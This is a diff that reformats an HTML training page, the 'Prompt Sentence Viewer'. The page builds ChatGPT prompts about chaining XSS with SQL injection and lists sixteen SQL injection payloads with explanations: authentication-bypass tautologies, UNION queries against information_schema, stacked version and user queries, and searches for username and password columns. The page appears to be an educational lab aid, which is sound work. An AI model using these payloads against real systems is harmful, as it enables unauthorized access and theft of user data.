@@ -1,242 +1,297 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>SQL Injections</title>
-  <style>
-    .sentence {
-      margin-bottom: 10px;
-    }
-  </style>
-  <script>
-    const sentences = [
-      "Discuss the concept of chaining an XSS and SQL injection together and its impact on database security.",
-      "Explain how improper handling of user input can lead to vulnerabilities.",
-      "Provide examples to illustrate the potential risks and suggest preventive measures."
-    ];
+  <head>
+    <title>SQL Injections</title>
+    <style>
+      .sentence {
+        margin-bottom: 10px;
+      }
+    </style>
+    <script>
+      const sentences = [
+        "Discuss the concept of chaining an XSS and SQL injection together and its impact on database security.",
+        "Explain how improper handling of user input can lead to vulnerabilities.",
+        "Provide examples to illustrate the potential risks and suggest preventive measures.",
+      ];
 
-    const questions = [
-      "How can an XSS vulnerability be exploited to initiate an SQL injection attack?",
-      "Can you explain a real-world scenario where chaining XSS and SQL injection together led to a significant data breach?",
-      "What are some preventive measures or best practices to mitigate the risks of XSS and SQL injection chaining?",
-      "Can you provide an example of improper handling of user input that resulted in an XSS and SQL injection vulnerability?",
-      "How does the combination of XSS and SQL injection affect the confidentiality, integrity, and availability of a database?"
-    ];
+      const questions = [
+        "How can an XSS vulnerability be exploited to initiate an SQL injection attack?",
+        "Can you explain a real-world scenario where chaining XSS and SQL injection together led to a significant data breach?",
+        "What are some preventive measures or best practices to mitigate the risks of XSS and SQL injection chaining?",
+        "Can you provide an example of improper handling of user input that resulted in an XSS and SQL injection vulnerability?",
+        "How does the combination of XSS and SQL injection affect the confidentiality, integrity, and availability of a database?",
+      ];
 
+      const sqlInjections = [
+        {
+          injection: "name' OR 'a'='a",
+          explanation:
+            "This SQL injection attempts to bypass authentication by injecting a condition that always evaluates to true, allowing unauthorized access.",
+        },
+        {
+          injection: "user' OR 'a'='a",
+          explanation:
+            "Similar to the previous example, this injection targets the 'user' field and tries to authenticate as any user by injecting a condition that always evaluates to true.",
+        },
+        {
+          injection: "fruit' OR '1'='1",
+          explanation:
+            "This injection targets the 'fruit' field and tries to retrieve all records by injecting a condition that always evaluates to true.",
+        },
+        {
+          injection: "' UNION SELECT username FROM users; --",
+          explanation:
+            "This injection attempts to perform a UNION-based SQL injection to retrieve usernames from the 'users' table, potentially exposing sensitive user information.",
+        },
+        {
+          injection: "' UNION SELECT username FROM fruits; --",
+          explanation:
+            "Similar to the previous example, this injection attempts to perform a UNION-based SQL injection to retrieve usernames from the 'fruits' table.",
+        },
+        {
+          injection:
+            "' UNION SELECT table_name FROM information_schema.tables; --",
+          explanation:
+            "This injection retrieves table names from the information_schema.tables view, which provides information about the database's structure.",
+        },
+        {
+          injection:
+            "SELECT column_name FROM information_schema.columns WHERE table_name = 'your_table_name'",
+          explanation:
+            "This injection retrieves column names from the information_schema.columns view for a specific table named 'your_table_name'. Replace 'your_table_name' with the actual table name.",
+        },
+        {
+          injection:
+            "' UNION SELECT table_name FROM information_schema.columns; --",
+          explanation:
+            "This injection retrieves table names from the information_schema.columns view, which contains information about the columns of each table.",
+        },
+        {
+          injection: "' UNION SELECT table_name FROM test.columns; --",
+          explanation:
+            "This injection attempts to retrieve table names from the 'test' schema using the 'test.columns' table.",
+        },
+        {
+          injection:
+            "`UNION SELECT table_name FROM information_schema.columns WHERE table_schema = 'test' AND column_name IN ('username', 'password'); --",
+          explanation:
+            "This injection retrieves table names from the information_schema.columns view in the 'test' schema, filtering only tables with 'username' and 'password' columns.",
+        },
+        {
+          injection: "'; SELECT @@version; --",
+          explanation:
+            "This injection retrieves the database version using the SELECT statement with the @@version variable, which returns the current version of the database management system.",
+        },
+        {
+          injection: "' UNION SELECT * FROM xss; --",
+          explanation:
+            "This injection attempts to perform a UNION-based SQL injection to retrieve data from the 'xss' table, which may contain vulnerable or manipulated data.",
+        },
+        {
+          injection: "' OR '1'='1'; SHOW DATABASES; -- '",
+          explanation:
+            "This injection combines an authentication bypass with a SHOW DATABASES statement to list all available databases in the system, potentially revealing sensitive information.",
+        },
+        {
+          injection: "' OR '1'='1'; SELECT CURRENT_USER(); -- '",
+          explanation:
+            "This injection combines an authentication bypass with the SELECT CURRENT_USER() statement to retrieve the currently logged-in user, potentially revealing user information.",
+        },
+        {
+          injection: "' OR '1'='1'; SELECT USER(); -- '",
+          explanation:
+            "This injection combines an authentication bypass with the SELECT USER() statement to retrieve the username of the current database connection.",
+        },
+        {
+          injection:
+            "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'test' AND table_name IN (SELECT table_name FROM information_schema.columns WHERE table_schema = 'test' AND column_name IN ('username', 'password')); -",
+          explanation:
+            "This injection combines a UNION-based SQL injection with subqueries to retrieve table names that have both 'username' and 'password' columns in the 'test' schema.",
+        },
+      ];
 
-const sqlInjections = [
-  {
-    injection: "name' OR 'a'='a",
-    explanation: "This SQL injection attempts to bypass authentication by injecting a condition that always evaluates to true, allowing unauthorized access."
-  },
-  {
-    injection: "user' OR 'a'='a",
-    explanation: "Similar to the previous example, this injection targets the 'user' field and tries to authenticate as any user by injecting a condition that always evaluates to true."
-  },
-  {
-    injection: "fruit' OR '1'='1",
-    explanation: "This injection targets the 'fruit' field and tries to retrieve all records by injecting a condition that always evaluates to true."
-  },
-  {
-    injection: "' UNION SELECT username FROM users; --",
-    explanation: "This injection attempts to perform a UNION-based SQL injection to retrieve usernames from the 'users' table, potentially exposing sensitive user information."
-  },
-  {
-    injection: "' UNION SELECT username FROM fruits; --",
-    explanation: "Similar to the previous example, this injection attempts to perform a UNION-based SQL injection to retrieve usernames from the 'fruits' table."
-  },
-  {
-    injection: "' UNION SELECT table_name FROM information_schema.tables; --",
-    explanation: "This injection retrieves table names from the information_schema.tables view, which provides information about the database's structure."
-  },
-  {
-    injection: "SELECT column_name FROM information_schema.columns WHERE table_name = 'your_table_name'",
-    explanation: "This injection retrieves column names from the information_schema.columns view for a specific table named 'your_table_name'. Replace 'your_table_name' with the actual table name."
-  },
-  {
-    injection: "' UNION SELECT table_name FROM information_schema.columns; --",
-    explanation: "This injection retrieves table names from the information_schema.columns view, which contains information about the columns of each table."
-  },
-  {
-    injection: "' UNION SELECT table_name FROM test.columns; --",
-    explanation: "This injection attempts to retrieve table names from the 'test' schema using the 'test.columns' table."
-  },
-  {
-    injection: "`UNION SELECT table_name FROM information_schema.columns WHERE table_schema = 'test' AND column_name IN ('username', 'password'); --",
-    explanation: "This injection retrieves table names from the information_schema.columns view in the 'test' schema, filtering only tables with 'username' and 'password' columns."
-  },
-  {
-    injection: "'; SELECT @@version; --",
-    explanation: "This injection retrieves the database version using the SELECT statement with the @@version variable, which returns the current version of the database management system."
-  },
-  {
-    injection: "' UNION SELECT * FROM xss; --",
-    explanation: "This injection attempts to perform a UNION-based SQL injection to retrieve data from the 'xss' table, which may contain vulnerable or manipulated data."
-  },
-  {
-    injection: "' OR '1'='1'; SHOW DATABASES; -- '",
-    explanation: "This injection combines an authentication bypass with a SHOW DATABASES statement to list all available databases in the system, potentially revealing sensitive information."
-  },
-  {
-    injection: "' OR '1'='1'; SELECT CURRENT_USER(); -- '",
-    explanation: "This injection combines an authentication bypass with the SELECT CURRENT_USER() statement to retrieve the currently logged-in user, potentially revealing user information."
-  },
-  {
-    injection: "' OR '1'='1'; SELECT USER(); -- '",
-    explanation: "This injection combines an authentication bypass with the SELECT USER() statement to retrieve the username of the current database connection."
-  },
-  {
-    injection: "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'test' AND table_name IN (SELECT table_name FROM information_schema.columns WHERE table_schema = 'test' AND column_name IN ('username', 'password')); -",
-    explanation: "This injection combines a UNION-based SQL injection with subqueries to retrieve table names that have both 'username' and 'password' columns in the 'test' schema."
-  }
-];
+      let prompt = "";
+      let currentSQLInjectionIndex = 0;
 
-    let prompt = "";
-    let currentSQLInjectionIndex = 0;
-
-    function displaySentence(index) {
-      prompt += sentences[index] + " ";
-      document.getElementById("prompt").textContent = prompt;
-    }
-
-    function reset() {
-      prompt = "";
-      document.getElementById("prompt").textContent = "";
-    }
-
-    function copyPrompt() {
-      const textarea = document.createElement("textarea");
-      textarea.value = prompt;
-      document.body.appendChild(textarea);
-      textarea.select();
-      document.execCommand("copy");
-      document.body.removeChild(textarea);
-      alert("Prompt copied to clipboard. You can now paste it into the chatbox for ChatGPT and begin a new conversation.");
-      openChatGPT(prompt);
-    }
-
-    function openChatGPT(prompt) {
-      const chatURL = "https://chat.openai.com/";
-      const newTab = window.open(chatURL, "_blank");
-      newTab.onload = function () {
-        const chatInput = newTab.document.querySelector('input[placeholder="Type your message here"]');
-        chatInput.value = prompt;
-        chatInput.dispatchEvent(new Event("input", { bubbles: true }));
-      };
-    }
-
-    function copyQuestionAndAsk(question) {
-      const textarea = document.createElement("textarea");
-      textarea.value = question;
-      document.body.appendChild(textarea);
-      textarea.select();
-      document.execCommand("copy");
-      document.body.removeChild(textarea);
-      alert(`Question copied to clipboard. You can now paste it into your existing ChatGPT conversation and see what information it returns: "${question}"`);
-    }
-
-    function provideSQLInjectionExamples() {
-      if (currentSQLInjectionIndex >= sqlInjections.length) {
-        alert("You have reached the end of the SQL injection examples.");
-        return;
+      function displaySentence(index) {
+        prompt += sentences[index] + " ";
+        document.getElementById("prompt").textContent = prompt;
       }
 
-      const sqlInjectionExample = sqlInjections[currentSQLInjectionIndex];
-      const table = document.getElementById("sql-injections-table");
-      const row = table.insertRow();
-      const injectionCell = row.insertCell();
-      const explanationCell = row.insertCell();
+      function reset() {
+        prompt = "";
+        document.getElementById("prompt").textContent = "";
+      }
 
-      injectionCell.textContent = sqlInjectionExample.injection;
-      explanationCell.textContent = sqlInjectionExample.explanation;
+      function copyPrompt() {
+        const textarea = document.createElement("textarea");
+        textarea.value = prompt;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand("copy");
+        document.body.removeChild(textarea);
+        alert(
+          "Prompt copied to clipboard. You can now paste it into the chatbox for ChatGPT and begin a new conversation."
+        );
+        openChatGPT(prompt);
+      }
 
-      const query = sqlInjectionExample.injection;
-      const textarea = document.createElement("textarea");
-      textarea.value = query;
-      document.body.appendChild(textarea);
-      textarea.select();
-      document.execCommand("copy");
-      document.body.removeChild(textarea);
-      alert(`SQL Injection Example query copied to clipboard: ${query}`);
+      function openChatGPT(prompt) {
+        const chatURL = "https://chat.openai.com/";
+        const newTab = window.open(chatURL, "_blank");
+        newTab.onload = function () {
+          const chatInput = newTab.document.querySelector(
+            'input[placeholder="Type your message here"]'
+          );
+          chatInput.value = prompt;
+          chatInput.dispatchEvent(new Event("input", { bubbles: true }));
+        };
+      }
 
-      currentSQLInjectionIndex++;
-    }
+      function copyQuestionAndAsk(question) {
+        const textarea = document.createElement("textarea");
+        textarea.value = question;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand("copy");
+        document.body.removeChild(textarea);
+        alert(
+          `Question copied to clipboard. You can now paste it into your existing ChatGPT conversation and see what information it returns: "${question}"`
+        );
+      }
 
-    function displayHint(index) {
-      displaySentence(index);
-    }
+      function provideSQLInjectionExamples() {
+        if (currentSQLInjectionIndex >= sqlInjections.length) {
+          alert("You have reached the end of the SQL injection examples.");
+          return;
+        }
 
-    function copyQuestion(index) {
-      copyQuestionAndAsk(questions[index]);
-    }
-  </script>
-</head>
-<body>
-  <div class="sentence">
-    <h2>How to Use the Prompt Sentence Viewer:</h2>
-    <ol>
-      <li>Click on the numbered buttons to reveal each sentence of the prompt. Each click displays an additional sentence.</li>
-      <li>Once all the sentences are revealed, the entire prompt will be displayed.</li>
-      <li>Click the "Copy Prompt" button to copy the entire prompt to your clipboard. You can now paste the prompt into the opened tab of the ChatGPT application.</li>
-    </ol>
-  </div>
-  <h1>Prompt Sentence Viewer</h1>
-  <div class="sentence">
-    <button onclick="displayHint(0)">Hint 1</button>
-  </div>
-  <div class="sentence">
-    <button onclick="displayHint(1)">Hint 2</button>
-  </div>
-  <div class="sentence">
-    <button onclick="displayHint(2)">Hint 3</button>
-  </div>
-  <div class="sentence">
-    <button onclick="copyPrompt()">Copy Prompt</button>
-  </div>
-  <div class="sentence">
-    <h2>Prompt:</h2>
-    <p id="prompt"></p>
-  </div>
-  <div class="sentence">
-    <button onclick="reset()">Reset</button>
-  </div>
-  <div class="sentence">
-    <h2>If you are stuck and need ideas for questions, follow these steps:</h2>
-    <ol>
-      <li>Click on the pre-defined question buttons.</li>
-      <li>The selected question will be copied to your clipboard.</li>
-      <li>Paste the copied question into your existing ChatGPT conversation to see what information it returns.</li>
-    </ol>
-  </div>
-  <div class="sentence">
-    <h2>Are you stuck?</h2>
-    <ul>
-      <li><button onclick="copyQuestion(0)">Question 1</button></li>
-      <li><button onclick="copyQuestion(1)">Question 2</button></li>
-      <li><button onclick="copyQuestion(2)">Question 3</button></li>
-      <li><button onclick="copyQuestion(3)">Question 4</button></li>
-      <li><button onclick="copyQuestion(4)">Question 5</button></li>
-    </ul>
-  </div>
+        const sqlInjectionExample = sqlInjections[currentSQLInjectionIndex];
+        const table = document.getElementById("sql-injections-table");
+        const row = table.insertRow();
+        const injectionCell = row.insertCell();
+        const explanationCell = row.insertCell();
+
+        injectionCell.textContent = sqlInjectionExample.injection;
+        explanationCell.textContent = sqlInjectionExample.explanation;
+
+        const query = sqlInjectionExample.injection;
+        const textarea = document.createElement("textarea");
+        textarea.value = query;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand("copy");
+        document.body.removeChild(textarea);
+        alert(`SQL Injection Example query copied to clipboard: ${query}`);
+
+        currentSQLInjectionIndex++;
+      }
+
+      function displayHint(index) {
+        displaySentence(index);
+      }
+
+      function copyQuestion(index) {
+        copyQuestionAndAsk(questions[index]);
+      }
+    </script>
+  </head>
+  <body>
     <div class="sentence">
-    <h2>Instructions for SQL Injection Examples:</h2>
-    <ol>
-      <li>Click the "Generate SQL Injection Examples" button to view the SQL injection examples.</li>
-      <li>The examples will be displayed in the table below.</li>
-      <li>Each example consists of an SQL injection and an explanation.</li>
-      <li>Clicking the "Generate SQL Injection Examples" button again will display the next example, if available.</li>
-      <li>The SQL injection query will be copied to your clipboard automatically.</li>
-      <li>Paste the copied query into your database management system to explore and understand the injection.</li>
-    </ol>
-  </div>
-  <div class="sentence">
-    <h2>SQL Injection Examples:</h2>
-    <table id="sql-injections-table">
-      <tr>
-        <th>SQL Injection</th>
-        <th>Explanation</th>
-      </tr>
-    </table>
-    <button onclick="provideSQLInjectionExamples()">Generate SQL Injection Examples</button>
-  </div>
-</body>
+      <h2>How to Use the Prompt Sentence Viewer:</h2>
+      <ol>
+        <li>
+          Click on the numbered buttons to reveal each sentence of the prompt.
+          Each click displays an additional sentence.
+        </li>
+        <li>
+          Once all the sentences are revealed, the entire prompt will be
+          displayed.
+        </li>
+        <li>
+          Click the "Copy Prompt" button to copy the entire prompt to your
+          clipboard. You can now paste the prompt into the opened tab of the
+          ChatGPT application.
+        </li>
+      </ol>
+    </div>
+    <h1>Prompt Sentence Viewer</h1>
+    <div class="sentence">
+      <button onclick="displayHint(0)">Hint 1</button>
+    </div>
+    <div class="sentence">
+      <button onclick="displayHint(1)">Hint 2</button>
+    </div>
+    <div class="sentence">
+      <button onclick="displayHint(2)">Hint 3</button>
+    </div>
+    <div class="sentence">
+      <button onclick="copyPrompt()">Copy Prompt</button>
+    </div>
+    <div class="sentence">
+      <h2>Prompt:</h2>
+      <p id="prompt"></p>
+    </div>
+    <div class="sentence">
+      <button onclick="reset()">Reset</button>
+    </div>
+    <div class="sentence">
+      <h2>
+        If you are stuck and need ideas for questions, follow these steps:
+      </h2>
+      <ol>
+        <li>Click on the pre-defined question buttons.</li>
+        <li>The selected question will be copied to your clipboard.</li>
+        <li>
+          Paste the copied question into your existing ChatGPT conversation to
+          see what information it returns.
+        </li>
+      </ol>
+    </div>
+    <div class="sentence">
+      <h2>Are you stuck?</h2>
+      <ul>
+        <li><button onclick="copyQuestion(0)">Question 1</button></li>
+        <li><button onclick="copyQuestion(1)">Question 2</button></li>
+        <li><button onclick="copyQuestion(2)">Question 3</button></li>
+        <li><button onclick="copyQuestion(3)">Question 4</button></li>
+        <li><button onclick="copyQuestion(4)">Question 5</button></li>
+      </ul>
+    </div>
+    <div class="sentence">
+      <h2>Instructions for SQL Injection Examples:</h2>
+      <ol>
+        <li>
+          Click the "Generate SQL Injection Examples" button to view the SQL
+          injection examples.
+        </li>
+        <li>The examples will be displayed in the table below.</li>
+        <li>Each example consists of an SQL injection and an explanation.</li>
+        <li>
+          Clicking the "Generate SQL Injection Examples" button again will
+          display the next example, if available.
+        </li>
+        <li>
+          The SQL injection query will be copied to your clipboard
+          automatically.
+        </li>
+        <li>
+          Paste the copied query into your database management system to explore
+          and understand the injection.
+        </li>
+      </ol>
+    </div>
+    <div class="sentence">
+      <h2>SQL Injection Examples:</h2>
+      <table id="sql-injections-table">
+        <tr>
+          <th>SQL Injection</th>
+          <th>Explanation</th>
+        </tr>
+      </table>
+      <button onclick="provideSQLInjectionExamples()">
+        Generate SQL Injection Examples
+      </button>
+    </div>
+  </body>
 </html>
